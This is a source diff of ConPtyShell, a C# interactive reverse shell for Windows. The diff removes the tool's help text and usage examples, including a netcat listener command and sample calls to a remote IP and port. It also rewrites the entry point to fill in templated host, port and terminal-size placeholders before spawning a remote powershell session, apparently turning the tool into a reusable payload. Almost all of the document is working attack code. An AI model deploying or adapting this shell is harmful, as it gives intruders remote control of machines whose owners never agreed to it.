@@ -1490,61 +1490,7 @@ public static class ConPtyShell
 
 public static class ConPtyShellMainClass
 {
-    private static string help = @"
 
-ConPtyShell - Fully Interactive Reverse Shell for Windows 
-Author: splinter_code
-License: MIT
-Source: https://github.com/antonioCoco/ConPtyShell
-    
-ConPtyShell - Fully interactive reverse shell for Windows
-
-Properly set the rows and cols values. You can retrieve it from
-your terminal with the command ""stty size"".
-
-You can avoid to set rows and cols values if you run your listener
-with the following command:
-    stty raw -echo; (stty size; cat) | nc -lvnp 3001
-
-If you want to change the console size directly from powershell
-you can paste the following commands:
-    $width=80
-    $height=24
-    $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
-    $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
-
-Usage:
-    ConPtyShell.exe remote_ip remote_port [rows] [cols] [commandline]
-
-Positional arguments:
-    remote_ip               The remote ip to connect
-    remote_port             The remote port to connect
-    [rows]                  Rows size for the console
-                            Default: ""24""
-    [cols]                  Cols size for the console
-                            Default: ""80""
-    [commandline]           The commandline of the process that you are going to interact
-                            Default: ""powershell.exe""
-                            
-Examples:
-    Spawn a reverse shell
-        ConPtyShell.exe 10.0.0.2 3001
-    
-    Spawn a reverse shell with specific rows and cols size
-        ConPtyShell.exe 10.0.0.2 3001 30 90
-    
-    Spawn a reverse shell (cmd.exe) with specific rows and cols size
-        ConPtyShell.exe 10.0.0.2 3001 30 90 cmd.exe
-        
-    Upgrade your current shell with specific rows and cols size
-        ConPtyShell.exe upgrade shell 30 90
-        
-";
-
-    private static bool HelpRequired(string param)
-    {
-        return param == "-h" || param == "--help" || param == "/?";
-    }
 
     private static void CheckArgs(string[] arguments)
     {
@@ -1552,10 +1498,6 @@ Examples:
             throw new ConPtyShellException("\r\nConPtyShell: Not enough arguments. 2 Arguments required. Use --help for additional help.\r\n");
     }
 
-    private static void DisplayHelp()
-    {
-        Console.Out.Write(help);
-    }
 
     private static string CheckRemoteIpArg(string ipString)
     {
@@ -1600,43 +1542,35 @@ Examples:
     public static string ConPtyShellMain(string[] args)
     {
         string output = "";
+        string RemoteIp = "{host_ip}";
+        string RemotePort= "{host_port}";
+        string Rows= "{stty_rows}";
+        string Col= "{stty_cols}";     
+        // ignore the args       
         if (args.Length == 0)
-        {
-            string RemoteIp = "{host_ip}";
-            string RemotePort= "{host_port}";
-            string Rows= "{stty_rows}";
-            string Col= "{stty_cols}";            
-            args = new string[] { RemoteIp, RemotePort, Rows, Col };
+            args = new string [] { RemoteIp, RemotePort, Rows, Col };
 
-        }        
-        if (args.Length == 1 && HelpRequired(args[0]))
+        string remoteIp = "";
+        int remotePort = 0;
+        bool upgradeShell = false;
+        try
         {
-            DisplayHelp();
+            CheckArgs(args);
+            if (args[0].Contains("upgrade"))
+                upgradeShell = true;
+            else
+            {
+                remoteIp = CheckRemoteIpArg(args[0]);
+                remotePort = CheckInt(args[1]);
+            }
+            uint rows = ParseRows(args);
+            uint cols = ParseCols(args);
+            string commandLine = ParseCommandLine(args);
+            output = ConPtyShell.SpawnConPtyShell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
         }
-        else
+        catch (Exception e)
         {
-            string remoteIp = "";
-            int remotePort = 0;
-            bool upgradeShell = false;
-            try
-            {
-                CheckArgs(args);
-                if (args[0].Contains("upgrade"))
-                    upgradeShell = true;
-                else
-                {
-                    remoteIp = CheckRemoteIpArg(args[0]);
-                    remotePort = CheckInt(args[1]);
-                }
-                uint rows = ParseRows(args);
-                uint cols = ParseCols(args);
-                string commandLine = ParseCommandLine(args);
-                output = ConPtyShell.SpawnConPtyShell(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine("\n" + e.ToString() + "\n");
-            }
+            Console.WriteLine("\n" + e.ToString() + "\n");
         }
         return output;
     }
